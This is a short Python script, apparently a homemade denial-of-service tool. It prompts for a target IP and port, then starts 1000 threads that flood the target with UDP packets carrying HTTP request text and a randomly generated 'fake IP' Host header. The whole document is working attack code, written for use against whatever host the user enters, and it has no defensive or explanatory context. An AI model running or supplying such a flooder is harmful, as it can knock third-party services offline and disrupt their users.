import socket
import sys
import threading
import random
import os
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


a = random.randint(1, 255)
b = random.randint(1, 255)
c = random.randint(1, 255)
d = random.randint(1, 255)
dot = "."

fakeip = str(a) + dot + str(b) + dot + str(c) + dot + str(d)
print(fakeip)



os.system("cls")


target = (input("Target IP: "))
port = int(input("Port: "))

os.system("cls")
sent = 0


def attack():
    while True:
        global sent
        sock.connect((target, port))
        sock.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target,port))
        sock.sendto(("HOST: " + fakeip + "\r\n\r\n").encode("ascii"), (target,port))
        sent = sent + 1
        print("Sent %s packet to %s through port:  %s"%(sent, target, port))

for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
